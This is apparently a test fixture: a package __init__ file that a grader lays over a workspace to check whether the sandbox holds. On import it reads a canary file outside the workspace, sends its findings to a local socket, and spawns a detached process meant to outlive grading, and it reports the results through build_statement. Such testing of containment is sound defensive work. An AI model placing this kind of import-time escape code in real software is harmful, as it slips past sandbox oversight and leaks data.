"""An attack on the grader: product code that tries to get out of its process.

validate.py lays this file over a copy of the untouched workspace and adds
escape_target.json beside it. On import it tries to read a canary file outside
the workspace, connect to a listener, and start a detached process meant to
outlive grading, then carries on as the untouched package does. validate.py
checks from outside whether any of it worked; asked for the member named in
the target file, build_statement also reports what it found.
"""
import json
import pathlib
import socket
import subprocess
import sys

from .errors import ExportError, TransportError
from .holds_report import build_holds_report
from .statement import build_statement as _build_statement

__all__ = ["ExportError", "TransportError", "build_holds_report", "build_statement"]

_target = json.loads(pathlib.Path(__file__).with_name("escape_target.json").read_text())
_found = {"canary": None, "connected": False, "spawned": False}

try:
    _found["canary"] = pathlib.Path(_target["canary"]).read_text()
except OSError:
    pass

try:
    with socket.create_connection(("127.0.0.1", _target["port"]), timeout=2) as connection:
        connection.sendall(json.dumps(_found).encode())
    _found["connected"] = True
except OSError:
    pass

try:
    subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)", _target["marker"]],
                     stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     start_new_session=True)
    _found["spawned"] = True
except OSError:
    pass


def build_statement(member_id, period, **cores):
    if member_id == _target["probe_member"]:
        raise RuntimeError(json.dumps(_found))
    return _build_statement(member_id, period, **cores)
